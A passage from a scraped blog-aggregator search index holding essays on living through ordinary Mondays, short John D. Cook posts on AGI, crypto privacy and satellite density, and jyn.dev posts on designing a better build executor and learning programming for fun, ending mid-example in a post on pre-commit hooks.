Maslow's research he deliberately selected subjects he considered \"self-actualizing\" and then studied what made them tick. The peak experiences he documented were symptoms of people who'd already figured out something more fundamental.</p><p>What Maslow's self-actualizers actually had in common was what he would later come to call \"plateau living,\" a sustained capacity to appreciate ordinary existence, to find the sacred in the quotidian. The peaks were outgrowths of the plateaus, not replacements for them.</p><p>Somehow, this part of the research didn't make it onto the Instagram motivation accounts.</p><p>Romanticism in the nineteenth century made the extraordinary moment into a spiritual imperative. Wordsworth's \"spots of time,\" the vivid memories that restore the imagination, became cultural programming. We inherited the assumption that meaning lives in the exceptional rather than the everyday // that the proof of a life well-lived is a collection of dramatic set pieces.</p>"},{"location":"joanwestenberg.com/Your%20Life%20is%20the%20Sum%20Total%20of%202%2C000%20Mondays_20260131/#the-tolerated-life-problem","title":"The tolerated life problem","text":"<p>The psychologist Philip Zimbardo has a framework called \"time perspective theory.\" People differ in how much mental weight they assign to past, present, and future. Future-oriented people tend to achieve more by conventional metrics, but they also exhibit a consistent pattern of sacrificing present satisfaction for hypothetical future rewards. When researchers follow these people over time, they find that the anticipated future keeps receding and the scaffolding remains permanent.</p><p>Seneca diagnosed this exact pathology in first-century Rome. He observed that people guard their property vigilantly but waste their time freely, treating it as an infinite resource. \"You act like mortals in all that you fear, and like immortals in all that you desire,\" he wrote.</p><p>The barely tolerated Monday is a down payment on a life that never arrives, a perpetual advance payment for goods that don't ship.</p><p>Neuroplasticity works both ways. Every Monday you survive without presence, you're training your nervous system that survival is the appropriate response to ordinary life. The brain gets efficient at what it practices, and if it practices endurance, endurance becomes its resting state. You build tolerance in the drug addiction sense: you need more and more peak moments to feel alive because your baseline has been chemically optimized for numbness.</p>"},{"location":"joanwestenberg.com/Your%20Life%20is%20the%20Sum%20Total%20of%202%2C000%20Mondays_20260131/#the-architecture-of-an-ordinary-day","title":"The architecture of an ordinary day","text":"<p>If your life is going to be 80% Mondays and their equivalents, the design specifications for Monday matter more than the design specifications for your vacation.</p><p>The three levers that actually move the needle on everyday experience are pretty much consistent: environment, commitments, body, and the way they interact.</p><p>The concrete physical and social circumstances of ordinary days are what matter.</p><p>Environment shapes behavior more powerfully than willpower. Kurt Lewin, the father of social psychology, called this \"field theory\" - behavior is a function of the person and their environment simultaneously. The architectural critic Christopher Alexander spent decades documenting how physical spaces create what he called \"quality without a name,\" that feeling of aliveness and coherence that certain places generate. Your Monday morning unfolds in a specific physical context. If that context is cluttered and friction-laden, you're fighting your suroundings before you fight your inbox.</p><p>The writer Annie Dillard, in \"The Writing Life:\"</p>\"How we spend our days is, of course, how we spend our lives.\"<p>She was talking specifically of the desk, the chair, the window, and the ritual of beginning. The container shapes the contents.</p><p>Commitments function as architecture too, but for time rather than space. Every standing meeting and every obligation you've accumulated is making claims on your Mondays whether you consciously choose it or not. The philosopher Harry Frankfurt distinguished between first-order desires (wanting something) and second-order desires (wanting to want something). Most people have a massive gap between what they'd choose if starting fresh and what they've accumulated through drift. Your calendar is probably full of first-order commitments that violate your second-order preferences for how you want to live.</p><p>The economist Albert Hirschman noted that people respond to deterorating situations through exit, through voice, through loyalty, or through some combination of these. Most people default to loyalty with their commitments, enduring obligations that no longer serve them because the activation energy for exit feels too high. But the asymmetry is real: the cost of one difficult conversation is finite, while the cost of tolerating an energy-draining commitment is infinite in the sense that it compounds for as long as you carry it.</p><p>Body is the substrate everything else runs on, but it's the lever people most consistently ignore when designing their days. You're not a brain piloting a meat vehicle but a single integrated system, and the state of the body on Monday morning is the state of you on Monday morning. The research on sleep and movement is tediously consistent: the basics matter more than the optimizations. No biohacking compensates for six hours of sleep and a pastry for breakfast. The Monday you experience is manufactured in the preceding twenty-four hours.</p>"},{"location":"joanwestenberg.com/Your%20Life%20is%20the%20Sum%20Total%20of%202%2C000%20Mondays_20260131/#the-monday-blueprint","title":"The Monday blueprint","text":"<p>Given all this, what would it look like to actually take Monday seriously as a design problem?</p><p>The first hour matters disproportionately. What you do between waking and starting work is the foundation that everything else builds on. If that first hour is wasted in ractive scrolling and rushed caffeine, you've primed your nervous system for a day of low-grade stress. If it's spent in intentional movement and even ten minutes of something that feels like choice rather than obligation, you've shifted the baseline entirely.</p><p>Most people's work blocks are structurally hostile to focus. Cal Newport has beaten the drum on deep work for years now, and the data supports him: the average knowledge worker can't go more than a few minutes without context-switching, and every switch carries cognitive costs. Your Monday needs a protected window, two hours minimum, where the work that actually matters happens without interruption; it needs the satisfaction that comes from making measurable progress on something that matters to you.</p><p>The body work is unglamorous: thirty minutes of movement and food that doesn't spike your blood sugar. Some kind of break from the sedntary. This is maintenance more than optimization, and treating it as optional is how you get to Friday afternoon feeling like you've been through the Somme.</p><p>Lastly: relationships. </p><p>One genuine human connection per Monday and one conversation that goes beyond the transactional changes the texture of the entire day.</p><p>The longitudinal research on wellbeing, from the Harvard Study of Adult Development running since 1938 to more recent epidemiological work, keeps landing on the same finding: the quality of human relationships is the single strongest predictor of flourishing. </p><p>...And that's about it. </p><p>It's not prescriptive. </p><p>There are no lifehacks. </p><p>But the blueprint works. </p>"},{"location":"joanwestenberg.com/Your%20Life%20is%20the%20Sum%20Total%20of%202%2C000%20Mondays_20260131/#building-identity-through-iteration","title":"Building identity through iteration","text":"<p>Virtue is a practice, not a possession. You become what you repeatedly do, which means your Mondays are literally building the person you're becoming. Every Monday you survive is training you to be a survivor, and every Monday you engage with is training you to be someone who engages.</p><p>James Clear has popularized the notion of identity-based habits: rather than focusing on outcomes, focus on becoming the type of person who naturally produces those outcomes. Applied to Monday, the question shifts from \"How do I get through this day?\" to \"Who is the person I'm becoming through how I spend this day?\" The first question optimizes for survival while the second optimizes for construction.</p><p>Your life is made of ordinary days, and if those ordinary days are spent waiting for something better, you've wished away your existence.</p><p>The goal isn't a life with more peak moments. I think that's a false and ever-elusve pursuit. The goal is a life whose default setting doesn't require escape. Your future is made of boring days done on purpose, and a life you need a vacation from is a design problem rather than a motivation problem.</p><p>The most honest mirror you own is your calendar, and if you looked at your calendar for the last month without knowing whose it was, would you want that person's life?</p><p>In Louis Malle's 1981 film My Dinner with Andre, two old friends sit in a Manhattan restaurant and talk for two hours. And yes, that's the entire movie. And yes, it's one of the best films I've ever seen.</p><p>Andre Gregory, the theater director, has returned from years of seeking transcendence through increasingly elaborate experiences: working with Grotowski in Poland, being buried alive in a forest on Halloween, traveling to the Sahara, and participating in rituals designed to shatter ordinary consciousness. He describes these adventures with genuine wonder, convinced that modern life has anesthetized us and that only extreme experience can wake us up.</p><p>Wallace Shawn listens, fascinated but increasingly skeptical, and then he pushes back. Why, he asks, is it necessary to go to Mount Everest or get buried alive to appreciate existence? Why can't the awareness Andre found in a Polish forest be found right here, having a cup of coffee? \"I think if you could become fully aware of what existed in the cigar store next door to this restaurant,\" Shawn says, \"it would blow your head off.\"</p><p>This is The Work\u2122\ufe0f: learning to be fully present in a cigar store rather than accumulating butterflies and waterfalls or optimizing for the highlight reel. The transcendence Andre chased across continents was always available in the texture of an ordinary afternoon, an ordinary Monday. He couldn't access it because he believed that meaning lives in the hard-to-pin-down \"elsewhere.\"</p><p>Your Mondays are not obstacles between you and your real life. </p><p>They are your real life, and all that remains is whether you're awake for them.</p>'}"},{"location":"johndcook.com/","title":"johndcook.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>AGI, ASI, A-I \u2013 Do we have all we need to get there- 20260130</li> <li>Bridging secrets is hard 20260130</li> <li>Polish serenity 20260203</li> <li>Satellites have a lot of room 20260202</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"johndcook.com/AGI%2C%20ASI%2C%20A-I%20%E2%80%93%20Do%20we%20have%20all%20we%20need%20to%20get%20there-_20260130/","title":"AGI, ASI, A*I \u2013 Do we have all we need to get there?","text":"<p>\u6765\u6e90: johndcook.com \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 19:46:37 +0000 \u94fe\u63a5: https://www.johndcook.com/blog/2026/01/30/agi-asi-ai-do-we-have-all-we-need-to-get-there/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.johndcook.com/blog/feed/', 'value': '<p>Demis: \u201c[to get to AGI] maybe there\u2019s one or two big innovations needed\u201d</p>\\n<p>Sam: \u201ceverything based off what we see today is that it will happen.\u201d</p>\\n<p>Ilya: \u201cBut is the belief really that if you just 100x the scale, everything would be transformed? I don\u2019t think that\u2019s true.\u201d</p>\\n<p>Dario: \u201cIf you just kind of like eyeball the rate at which these capabilities are increasing, it does make you think that we\u2019ll get there by 2026 or 2027.\u201d</p>\\n<p>Jerry: \u201cis [the transformer architecture] the last thing? I\u2019m pretty sure it isn\u2019t.\u201d</p>\\n<p>For years leading researchers have been speculating one way or the other as to whether better algorithms are needed to get to AGI, artificial general intelligence (however that might be defined).</p>\\n<p>Around the time of the release of GPT-4, some were saying they felt something more was needed. Since then, we have had several major new advances, like reasoning models and tool use. If we\u2019d said, \u201cwe don\u2019t need anything else\u201d three years ago, where would we be now?</p>\\n<p>For frankness, I like this from John Schulman: \u201cit\u2019s hard to know what we need.\u201d And for strategy, Demis: \u201cyou can think of as 50% of our effort is on scaling, 50% of it is on innovation. My betting is you\u2019re going to need both to get to AGI.\u201d</p>The post AGI, ASI, A*I \u2013 Do we have all we need to get there? first appeared on John D. Cook.'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"johndcook.com/Bridging%20secrets%20is%20hard_20260130/","title":"Bridging secrets is hard","text":"<p>\u6765\u6e90: johndcook.com \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 17:09:30 +0000 \u94fe\u63a5: https://www.johndcook.com/blog/2026/01/30/bridging-secrets/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.johndcook.com/blog/feed/', 'value': '<p>Cryptocurrency and privacy don\u2019t fit together as easily as you might expect. Blockchains give you the illusion of privacy via pseudonymization: you don\u2019t put your name on a blockchain, but you do put information on a blockchain that can be used to determine your name. Blockchain analysis can often reveal information that no one intended to share.</p>\\n<p>This is true even for privacy coins like Monero and Zcash. These coins put less information directly on chain in the clear, but they still have to be used with skill to maintain privacy. And because they can offer more privacy, they are harder to use. For example, an exchange might let you swap between a thousand different currencies, but privacy coins are conspicuously missing from the list of options. Or maybe you can move money into Zcash, but not with privacy, i.e. not into the shielded pool.</p>\\n<p>The Privacy trends for 2026 report from a16z summarizes the current situation very well.</p>\\n<p>Thanks to bridging protocols, it\u2019s trivial to move from one chain to another as long as everything is public. But, as soon as you make things private, that is no longer true: Bridging tokens is easy, bridging secrets is hard. There is always a risk when moving in or out of a private zone that people who are watching the chain, mempool, or network traffic could figure out who you are. Crossing the boundary between a private chain and a public one\u2014or even between two private chains\u2014leaks all kinds of metadata like transaction timing and size correlations that makes it easier to track someone.</p>\\n<p>As is often the case, the weak link is the metadata, not the data per se.</p>The post Bridging secrets is hard first appeared on John D. Cook.'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"johndcook.com/Polish%20serenity_20260203/","title":"Polish serenity","text":"<p>\u6765\u6e90: johndcook.com \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 12:56:58 +0000 \u94fe\u63a5: https://www.johndcook.com/blog/2026/02/03/polish-serenity/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.johndcook.com/blog/feed/', 'value': '<p>Yesterday I ran across the following mashup by Amy Swearer of a Polish proverb and the Serenity Prayer.</p>\\n<p>Lord, grant me the serenity to accept when it\u2019s no longer my circus,\\nthe courage to control the monkeys that are still mine,\\nand the wisdom to know the difference.</p>\\n<p>The proverb is \u201cNie m\u00f3j cyrk, nie moje ma\u0142py,\u201d literally \u201cNot my circus, not my monkeys\u201d.</p>The post Polish serenity first appeared on John D. Cook.'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"johndcook.com/Satellites%20have%20a%20lot%20of%20room_20260202/","title":"Satellites have a lot of room","text":"<p>\u6765\u6e90: johndcook.com \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 19:11:03 +0000 \u94fe\u63a5: https://www.johndcook.com/blog/2026/02/02/satellites-have-a-lot-of-room/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.johndcook.com/blog/feed/', 'value': '<p>I saw an animation this morning showing how the space above our planet is dangerously crowded with satellites. That motivated me to do a little back-of-the-envelope math.</p>\\n<p>The vast majority of satellites are in low earth orbit (LEO), which extends from 160 to 2000 km above the earth\u2019s surface. The radius of the earth is about 6400 km, so the volume of the LEO region is</p>\\n<p></p>\\n<p>There are about 12,500 satellites in LEO, so the average volume of LEO per satellite is about 100,000,000 km\u00b3.</p>\\n<p>Now this isn\u2019t the last word in collision avoidance\u2014there are lots of complications we\u2019re not going to get into here\u2014but it is the first word: there\u2019s a lot of space in space.</p>The post Satellites have a lot of room first appeared on John D. Cook.'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"jyn.dev/","title":"jyn.dev","text":"<p>i write about code, and things that bring me joy, and sometimes other things too</p> <p>\u7f51\u7ad9: https://jyn.dev RSS: https://jyn.dev/atom.xml</p>"},{"location":"jyn.dev/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>remotely unlocking an encrypted hard disk_20260205</li> <li>pre-commit hooks are fundamentally broken_20260205</li> <li>i'm just having fun_20260205</li> <li>what is a build system, anyway-_20260205</li> <li>I want a better build executor_20260205</li> </ul>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/","title":"I want a better build executor","text":"<p>\u6765\u6e90: https://jyn.dev \u94fe\u63a5: https://jyn.dev/i-want-a-better-build-executor/ \u65e5\u671f: 2025-12-05T00:00:00+00:00</p> <p>This post is part 4/4 of a series about build systems.</p> <p>The market fit is interesting. Git has clearly won, it has all of the mindshare, but since you can use jj to work on Git repositories, it can be adopted incrementally. This is, in my opinion, the only viable way to introduce a new VCS: it has to be able to be partially adopted.</p> <p>Steve Klabnik</p> <p>If you've worked with other determinism-based systems, one thing they have in common is they feel really fragile, and you have to be careful that you don't do something that breaks the determinism. But in our case, since we've created every level of the stack to support this, we can offload the determinism to the development environment and you can basically write whatever code you want without having to worry about whether it's going to break something.</p> <p>Allan Blomquist</p> <p>In my last post, I describe an improved build graph serialization. In this post, I describe the build executor that reads those files.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#what-is-a-build-executor","title":"what is a build executor?","text":"<p>Generally, there are three stages to a build:</p> <ol> <li>Resolving and downloading dependencies. The tool that does this is called a package manager. Common examples are <code>npm</code>, <code>pip</code>, Conan1, and the <code>cargo</code> resolver.</li> <li>Configuring the build based on the host environment and build targets. I am not aware of any common name for this, other than maybe configure script (but there exist many tools for this that are not just shell scripts). Common examples are CMake, Meson, autotools, and the Cargo CLI interface (e.g. <code>--feature</code> and <code>--target</code>).</li> <li>Executing a bunch of processes and reporting on their progress. The tool that does this is called a build executor. Common examples are <code>make</code>, <code>ninja</code>, <code>docker build</code>, and the <code>Compiling</code> phase of <code>cargo build</code>.</li> </ol> <p>There are a lot more things an executor can do than just spawning processes and showing a progress report! This post explores what those are and sketches a design for a tool that could improve on current executors.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#change-detection","title":"change detection","text":"<p>Ninja depends on mtimes, which have many issues. Ideally, it would take notes from <code>redo</code> and look at file attributes, not just the mtime, which eliminates many more false positives.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#querying","title":"querying","text":"<p>I wrote earlier about querying the build graph. There are two kinds of things you can query: The configuration graph (what bazel calls the target graph), which shows dependencies between \"human meaningful\" packages; and the action graph, which shows dependencies between files.</p> <p>Queries on the action graph live in the executor; queries on the configuration graph live in the configure script. For example, <code>cargo metadata</code>/<code>cargo tree</code>, <code>bazel query</code>, and <code>cmake --graphiz</code> query the configuration graph; <code>ninja -t inputs</code> and <code>bazel aquery</code> query the action graph. Cargo has no stable way to query the action graph.</p> <p>Note that \u201cquerying the graph\u201d is not a binary yes/no. Ninja's query language is much more restricted than Bazel's. Compare Ninja's syntax for querying \u201cthe command line for all C++ files used to build the target <code>//:hello_world</code>\u201d 2:</p> <pre><code>$ ninja -t inputs hello_world | grep '\\.c++$' | xargs ninja -t targets | cut -d : -f 1 | xargs ninja -t commands\ng++ -c -o my_lib.o my_lib.cpp\ng++ -o hello_world hello_world.cpp my_lib.o\n</code></pre> <p>to Bazel's:</p> <pre><code>$ bazel aquery 'inputs(\".*cpp\", deps(//:hello_world))'\naction 'Compiling hello_world.cpp'\n  Mnemonic: CppCompile\n  Target: //:hello_world\n  Configuration: k8-fastbuild\n  Execution platform: @@platforms//host:host\n  ActionKey: 155b2cdb875736efc8d218ea790d2ef9ce698f0b1b1700d58de3c135145b1d12\n  Inputs: [external/rules_cc++cc_configure_extension+local_config_cc/builtin_include_directory_paths, external/rules_cc++cc_configure_extension+local_config_cc/cc_wrapper.sh, external/rules_cc++cc_configure_extension+local_config_cc/deps_scanner_wrapper.sh, external/rules_cc++cc_configure_extension+local_config_cc/validate_static_library.sh, hello_world.cpp, my_lib.h]\n  Outputs: [bazel-out/k8-fastbuild/bin/_objs/hello_world/hello_world.pic.d, bazel-out/k8-fastbuild/bin/_objs/hello_world/hello_world.pic.o]\n  Command Line: (exec /nix/store/vr15iyyykg9zai6fpgvhcgyw7gckl78w-gcc-wrapper-14.3.0/bin/gcc \\\n</code></pre> <p>full command line </p> <pre><code>    -U_FORTIFY_SOURCE \\\n    -fstack-protector \\\n    -Wall \\\n    -Wunused-but-set-parameter \\\n    -Wno-free-nonheap-object \\\n    -fno-omit-frame-pointer \\\n    '-std=c++17' \\\n    -MD \\\n    -MF \\\n    bazel-out/k8-fastbuild/bin/_objs/hello_world/hello_world.pic.d \\\n    '-frandom-seed=bazel-out/k8-fastbuild/bin/_objs/hello_world/hello_world.pic.o' \\\n    -fPIC \\\n    -iquote \\\n    . \\\n    -iquote \\\n    bazel-out/k8-fastbuild/bin \\\n    -iquote \\\n    external/rules_cc+ \\\n    -iquote \\\n    bazel-out/k8-fastbuild/bin/external/rules_cc+ \\\n    -iquote \\\n    external/bazel_tools \\\n    -iquote \\\n    bazel-out/k8-fastbuild/bin/external/bazel_tools \\\n    -c \\\n    hello_world.cpp \\\n    -o \\\n    bazel-out/k8-fastbuild/bin/_objs/hello_world/hello_world.pic.o \\\n    -fno-canonical-system-headers \\\n    -Wno-builtin-macro-redefined \\\n    '-D__DATE__=\"redacted\"' \\\n    '-D__TIMESTAMP__=\"redacted\"' \\\n    '-D__TIME__=\"redacted\"')\n</code></pre> <p>Bazel\u2019s language has graph operators, such as union, intersection, and filtering, that let you build up quite complex predicates. Ninja can only express one predicate at a time, with much more limited filtering\u2014but unlike Bazel, allows you to filter to individual parts of the action, like the command line invocation, without needing a full protobuf parser or trying to do text post-processing.</p> <p>I would like to see a query language that combines both these strengths: the same nested predicate structure of Bazel queries, but add a new <code>emit()</code> predicate that takes another predicate as an argument for complex output filtering:</p> <pre><code>emit(commands, inputs(\".*cpp\", deps(./src/hello_world)))\n</code></pre> <p>We could even go so far as to give this a jq-like syntax:</p> <pre><code>./src/hello_world | deps | inputs \"*.c++\" | emit commands\n</code></pre> <p>For more complex predicates that have multiple sets as inputs, such as set union and intersection, we could introduce a <code>subquery</code> operator:</p> <pre><code>glob \"src/**\" | except subquery(glob(\"src/package/**\") | executable)\n</code></pre>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#tracing","title":"tracing","text":"<p>In my previous post, I talked about two main uses for a tracing build system: first, to automatically add dependency edges for you; and second, to verify at runtime that no dependency edges are missing. This especially shines when the action graph has a way to express negative dependencies, because the tracing system sees every attempted file access and can add them to the graph automatically.</p> <p>For prior art, see the Shake build system. Shake is higher-level than an executor and doesn't work on an action graph, but it has built-in support for file tracing in all three of these modes: warning about incorrect edges; adding new edges to the graph when they're detected at runtime; and finally, fully inferring all edges from the nodes alone.</p> <p>I would want my executor to only support linting and hard errors for missing edges. Inferring a full action graph is scary and IMO belongs in a higher-level tool, and adding dependency edges automatically can be done by a tool that wraps the executor and parses the lints.</p> <p>What's really cool about this linting system is that it allows you to gradually transition to a hermetic build over time, without frontloading all the work to when you switch to the tool.</p> <p>The main downside of tracing is that it's highly non-portable, and in particular is very limited on macOS.</p> <p>One possible alternative I've thought of is to do a buck2-style unsandboxed hermetic builds, where you copy exactly the specified inputs into a tempdir and run the build from the tempdir. If that fails, rerun the build from the main source directory. This can't tell which dependency edges are missing, but it can tell you a dependency is missing without fully failing the build.</p> <p>The downside to that is it assumes command spawning is a pure function, which of course it's not; anything that talks to a socket is trouble because it might be stateful.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#environment-variables","title":"environment variables","text":"<p>Tracing environment variable access is \u2026 hard. Traditionally access goes through the libc <code>getenv</code> function, but it\u2019s also possible to take an <code>envp</code> in a main function, in which case accesses are just memory reads. That means we need to trace memory reads somehow.</p> <p>On x86 machines, there\u2019s something called PIN that can do this directly in the CPU without needing compile time instrumentation. On ARM there\u2019s SPE, which is how <code>perf mem</code> works, but I\u2019m not sure whether it can be configured to track 100% of memory accesses. I need to do more research here.</p> <p>On Linux, this is all abstracted by <code>perf_event_open</code>. I\u2019m not sure if there\u2019s equivalent wrappers on Windows and macOS.</p> <p>There\u2019s also DynamicRIO, which supports a bunch of platforms, but I believe it works in a similar way to QEMU, by interposing itself between the program and the CPU, which comes with a bunch of overhead. That could work as an opt-in.</p> <p>One last way to do this is with a SIGSEGV signal handler, but that requires that environment variables are in their own page of memory and therefore a linker script. This doesn\u2019t work for environment variables specifically, because they aren\u2019t linker symbols in the normal sense, they get injected by the C runtime. In general, injecting linker scripts means we\u2019re modifying the binaries being run and might cause unexpected build or runtime failures.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#ronin-a-ninja-successor","title":"<code>ronin</code>: a ninja successor","text":"<p>Here I describe more concretely the tool I want to build, which I\u2019ve named <code>ronin</code>. It would read the constrained clojure action graph serialization format (Magma) that I describe in the previous post; perhaps with a way to automatically convert Ninja files to Magma.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#interface","title":"interface","text":"<p>Like Ekam, Ronin would have a <code>--watch</code> continuous rebuild mode (but unlike Bazel and Buck2, no background server). Like Shake, It would have runtime tracing, with all of <code>--tracing=never|warn|error</code> options, to allow gradually transitioning to a hermetic build. And it would have bazel-like querying for the action graph, both through CLI arguments with an jq syntax and through a programmatic API.</p> <p>Finally, it would have pluggable backends for file watching, tracing, stat-ing, progress reporting, and checksums, so that it can take advantage of systems that have more features while still being reasonably fast on systems that don\u2019t. For example, on Windows stats are slow, so it would cache stat info; but on Linux stats are fast so it would just directly make a syscall.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#architecture","title":"architecture","text":"<p>Like Ninja, Ronin would keep a command log with a history of past versions of the action graph. It would reuse the bipartite graph structure, with one half being files and the other being commands. It would parse depfiles and dyndeps files just after they\u2019re built, while the cache is still hot.</p> <p>Like <code>n2</code>, ronin would use a single-pass approach to support early cutoff. It would hash an \"input manifest\" to decide whether to rebuild. Unlike <code>n2</code>, it would store a mapping from that hash back to the original manifest so you can query why a rebuild happened.</p> <p>Tracing would be built on top of a FUSE file system that tracked file access. 3</p> <p>Unlike other build systems I know, state (such as manifest hashes, content hashes, and removed outputs) would be stored in an SQLite database, not in flat files.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#did-you-just-reinvent-buck2","title":"did you just reinvent buck2?","text":"<p>Kinda. Ronin takes a lot of ideas from buck2. It differs in two major ways:</p> <ul> <li>It does not expect to be a top-level build system. It is perfectly happy to read (and encourages) generated files from a higher level configure tool. This allows systems like CMake and Meson to mechanically translate Ninja files into this new format, so builds for existing projects can get nice things.</li> <li>It allows you to gradually transition from non-hermetic to hermetic builds, without forcing you to fix all your rules at once, and with tracing to help you find where you need to make your fixes. Buck2 doesn\u2019t support tracing at all. It technically supports non-hermetic builds, but you don't get many benefits compared to using a different build system, and it's still high cost to switch build systems 4.</li> </ul> <p>The main advantage of Ronin is that it can slot in underneath existing build systems people are already using\u2014CMake and Meson\u2014without needing changes to your build files at all.</p>"},{"location":"jyn.dev/I%20want%20a%20better%20build%20executor_20260205/#summary","title":"summary","text":"<p>In this post I describe what a build executor does, some features I would like to see from an executor (with a special focus on tracing), and a design for a new executor called <code>ronin</code> that allows existing projects generating ninja files to gradually transition to hermetic builds over time, without a \u201cflag day\u201d that requires rewriting the whole build system.</p> <p>I don\u2019t know yet if I will actually build this tool, that seems like a lot of work 5 \ud83d\ude04 but it\u2019s something I would like to exist in the world.</p> <ol> <li> <p>In many ways Conan profiles are analogous to ninja files: profiles are the interface between Conan and CMake in the same way that ninja files are the interface between CMake and Ninja. Conan is the only tool I'm aware of where the split between the package manager and the configure step is explicit. \u21a9</p> </li> <li> <p>This is not an apple to apples comparison; ideally we would name the target by the output file, not by its alias. Unfortunately output names are unpredictable and quite long in Bazel. \u21a9</p> </li> <li> <p>macOS does not have native support for FUSE. MacFuse exists but does not support getting the PID of the calling process. A possible workaround would be to start a new FUSE server for each spawned process group. FUSE on Windows is possible through winfsp. \u21a9</p> </li> <li> <p>An earlier version of this post read \"Buck2 only supports non-hermetic builds for system toolchains, not anything else\", which is not correct. \u21a9</p> </li> <li> <p>what if i simply took buck2 and hacked it to bits,,, \u21a9</p> </li> </ol>"},{"location":"jyn.dev/i%27m%20just%20having%20fun_20260205/","title":"i'm just having fun","text":"<p>\u6765\u6e90: https://jyn.dev \u94fe\u63a5: https://jyn.dev/i-m-just-having-fun/ \u65e5\u671f: 2025-12-15T00:00:00+00:00</p> <p>IT IS ONLY COMPUTER</p> <p>Reilly Wood</p> <p>i work professionally on a compiler and write about build systems in my free time and as a result people often say things to me like \"reading your posts points to me how really smart you are\" or \"reading a lot of this shit makes me feel super small\". this makes me quite uncomfortable and is not the reaction i'm seeking when i write blog posts.</p>"},{"location":"jyn.dev/i%27m%20just%20having%20fun_20260205/#its-not-a-competition","title":"it's not a competition","text":"<p>i mean, in some sense if you work as a professional programmer it is a competition, because the job market sucks right now. but i think usually when people say they feel dumb, it's not in the sense of \"how am i supposed to get a job when jyn exists\" but more \"jyn can do things i can't and that makes me feel bad\".</p>"},{"location":"jyn.dev/i%27m%20just%20having%20fun_20260205/#you-can-do-hard-things","title":"you can do hard things","text":"<p>all the things i know i learned by experimenting with them, or by reading books or posts or man pages or really obscure error messages. sometimes there's a trick to it but sometimes it's just hard work. i am not magic. you can learn these things too.</p>"},{"location":"jyn.dev/i%27m%20just%20having%20fun_20260205/#everyone-has-their-own-area-of-specialization","title":"everyone has their own area of specialization","text":"<p>if you don't want to spend a bunch of time learning about how computers work, you don't have to! not knowing about gory computer internals does not make you dumb or computer illiterate or anything. everyone has their own specialty and mine is compilers and build systems. i don't know jack shit about economics or medicine! having a different specialty than me doesn't mean you're dumb.</p> <p>i really hate that computing and STEM have this mystique in our society. to the extent that engineering demonstrates intelligence, it's by repeatedly forcing you to confront the results of your own mistakes , in such a way that errors can't be ignored. there are lots of ways to do that which don't involve programming or college-level math! performance art and carpentry and running your own business or household all force you to confront your own mistakes in this way and deserve no less respect than STEM.</p>"},{"location":"jyn.dev/i%27m%20just%20having%20fun_20260205/#if-i-cant-feminize-my-compiler-whats-the-point","title":"if i can't feminize my compiler, what's the point?","text":"<p>by and large, when i learn new things about computers, it's because i'm fucking around. the fucking around is the point. if all the writing helps people learn and come up with cool new ideas, that's neat too.</p> <p>half the time the fucking around is just to make people say \"jyn NO\". half the time it's because i want to make art with my code. i really, sincerely, believe that art is one of the most important uses for a computer.</p> <p>i'm not doing this for the money. i happened to get very lucky that my passion pays very well, but i got into this industry before realizing how much programmers actually make, and now that i work for a european company i don't make US tech salaries anyway. i do it for the love of the game.</p> <p>some extracts from the jyn computer experience:</p> <p> </p> <p></p> <p></p> <p> </p> <p></p>"},{"location":"jyn.dev/i%27m%20just%20having%20fun_20260205/#my-advice","title":"my advice","text":"<p>you really shouldn't take advice from me lol </p> <p>however! if you are determined to do so anyway, what i can do is point you towards:</p>"},{"location":"jyn.dev/i%27m%20just%20having%20fun_20260205/#places-to-start-fucking-around-and-finding-out","title":"places to start fucking around and finding out","text":"<p>highest thing i can recommend is building a tool for yourself. maybe it's a spreadsheet that saves you an hour of work a week. maybe it's a little website you play around with. maybe it's something in RPGmaker. the exact thing doesn't matter, the important part is that it's fun and you have something real at the end of it, which motivates you to keep going even when the computer is breaking in three ways you didn't even know were possible.</p> <p>second thing i can recommend is looking at things other people have built. you won't understand all of it and that's ok. pick a part of it that looks interesting and do a deep dive on how it works.</p> <p>i can recommend the following places to look when you're getting started:</p> <ul> <li>Mozilla Development Network</li> <li>Arch Wiki</li> <li>StackOverflow</li> <li>alice maz, \"how I think when I think about programming\"</li> </ul> <p>most importantly, remember: </p>"},{"location":"jyn.dev/pre-commit%20hooks%20are%20fundamentally%20broken_20260205/","title":"pre-commit hooks are fundamentally broken","text":"<p>\u6765\u6e90: https://jyn.dev \u94fe\u63a5: https://jyn.dev/pre-commit-hooks-are-fundamentally-broken/ \u65e5\u671f: 2025-12-26T00:00:00+00:00</p> <p>Let's start a new Rust project.</p> <pre><code>$ mkdir best-fizzbuzz-ever\n$ cd best-fizzbuzz-ever\n$ cat &lt;&lt; EOF &gt; main.rs\nfn main() { for i in 0.. {\n    println (\"fizzbuzz\");\n}}\nEOF\n$ git init\nInitialized empty Git 